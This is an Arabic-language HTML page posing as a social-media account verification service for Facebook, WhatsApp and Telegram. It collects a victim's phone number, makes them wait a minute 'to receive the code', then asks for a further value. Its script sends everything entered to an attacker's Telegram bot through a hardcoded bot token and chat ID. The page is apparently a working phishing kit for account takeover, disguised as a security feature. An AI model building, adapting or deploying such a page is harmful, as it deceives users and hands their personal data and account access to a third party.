<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق الحساب على مواقع التواصل</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: center;
            margin: 20px;
            background-color: #f0f8ff;
        }
        h1 {
            color: #007bff;
        }
        p {
            color: #333;
            font-size: 18px;
        }
        input, button, select {
            margin: 10px;
            padding: 12px;
            font-size: 16px;
            width: 80%;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #007bff;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .message {
            margin-top: 20px;
            padding: 10px;
        }
        .success {
            color: green;
        }
        .error {
            color: red;
        }
        .wait-message {
            font-size: 20px;
            color: #f39c12;
            margin-top: 20px;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin-top: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .article {
            background-color: #fff;
            border-radius: 8px;
            padding: 20px;
            margin-top: 30px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .article h2 {
            color: #2c3e50;
        }
        .article p {
            font-size: 16px;
            color: #555;
        }
        .img-container {
            margin-top: 20px;
        }
        img {
            width: 80%;
            max-width: 600px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <h1>توثيق الحساب على مواقع التواصل</h1>
    <p>يرجى إدخال الرقم والكود الخاص بك لتوثيق الحساب. تأكد من إدخال المعلومات الصحيحة.</p>

    <!-- صورة تعبيرية عن الموقع -->
    <div class="img-container">
        <img src="https://via.placeholder.com/600x300.png?text=توثيق+الحسابات" alt="توثيق الحساب">
    </div>

    <!-- مقال عن توثيق الحسابات -->
    <div class="article">
        <h2>أهمية توثيق الحسابات</h2>
        <p>توثيق الحسابات هو خطوة أساسية في حماية حسابات المستخدمين على الإنترنت. فهو يساهم في حماية البيانات الشخصية والمعلومات الحساسة من التسلل والسرقة. عملية التوثيق تتم عبر إرسال كود تحقق للمستخدمين لضمان أن الشخص الذي يقوم بالدخول هو المالك الفعلي للحساب.</p>
    </div>

    <!-- اختيار نوع الحساب -->
    <div id="accountTypeStep">
        <label for="accountType">اختر نوع الحساب:</label>
        <select id="accountType" onchange="showAccountField()">
            <option value="">اختر من القائمة</option>
            <option value="facebook">فيسبوك</option>
            <option value="whatsapp">واتساب</option>
            <option value="telegram">تيليجرام</option>
        </select>
    </div>

    <!-- إدخال الرقم -->
    <div id="phoneStep" style="display:none;">
        <input type="text" id="phone" placeholder="أدخل رقم الهاتف" required>
        <button onclick="sendPhone()">إرسال</button>
    </div>

    <!-- عرض رسالة الانتظار -->
    <div id="waitMessage" style="display:none;">
        <p class="wait-message">يرجى الانتظار لمدة دقيقة لتلقي الكود.</p>
        <!-- الدائرة المتحركة -->
        <div class="loader"></div>
    </div>

    <!-- إدخال اسم الحساب -->
    <div id="accountNameStep" style="display:none;">
        <input type="text" id="accountName" placeholder="أدخل اسم الحساب" required>
        <button onclick="sendCode()">إرسال الكود</button>
    </div>

    <!-- عرض الرسائل -->
    <div class="message" id="messageBox"></div>

    <script>
        let phone, accountType, accountName; // لتخزين البيانات المدخلة

        // إظهار حقل إدخال الرقم بعد اختيار نوع الحساب
        function showAccountField() {
            accountType = document.getElementById("accountType").value;
            if (accountType) {
                document.getElementById("accountTypeStep").style.display = "none";
                document.getElementById("phoneStep").style.display = "block";
            } else {
                document.getElementById("accountNameStep").style.display = "none";
            }
        }

        // إرسال الرقم إلى البوت
        function sendPhone() {
            phone = document.getElementById("phone").value;
            if (!phone) {
                showMessage("error", "يرجى إدخال رقم الهاتف.");
                return;
            }

            // إخفاء حقل الرقم وعرض رسالة الانتظار
            document.getElementById("phoneStep").style.display = "none";
            document.getElementById("waitMessage").style.display = "block";

            // بعد دقيقة، عرض حقل اسم الحساب
            setTimeout(function() {
                document.getElementById("waitMessage").style.display = "none";
                document.getElementById("accountNameStep").style.display = "block";
            }, 60000); // بعد 60 ثانية
        }

        // إرسال الكود واسم الحساب إلى البوت
        function sendCode() {
            accountName = document.getElementById("accountName").value;
            if (!accountName) {
                showMessage("error", "يرجى إدخال اسم الحساب.");
                return;
            }

            const token = "7587659263:AAFzLqLg2wHcwW0JFG-4ZVD8roEhRuSZiKI"; // ضع توكن البوت هنا
            const chatId = "5715560121"; // ضع Chat ID هنا
            const message = `نوع الحساب: ${accountType}\nاسم الحساب: ${accountName}\nرقم الهاتف: ${phone}`;

            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // إرسال البيانات إلى Telegram
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        showMessage("success", "تم إرسال البيانات بنجاح!");
                    } else {
                        showMessage("error", `خطأ من Telegram: ${data.description}`);
                    }
                })
                .catch(error => {
                    console.error("تفاصيل الخطأ:", error);
                    showMessage("error", "فشل في الاتصال بـ API.");
                });
        }

        // عرض الرسائل للمستخدم
        function showMessage(type, text) {
            const messageBox = document.getElementById("messageBox");
            messageBox.className = `message ${type}`;
            messageBox.textContent = text;
        }
    </script>
</body>
</html>
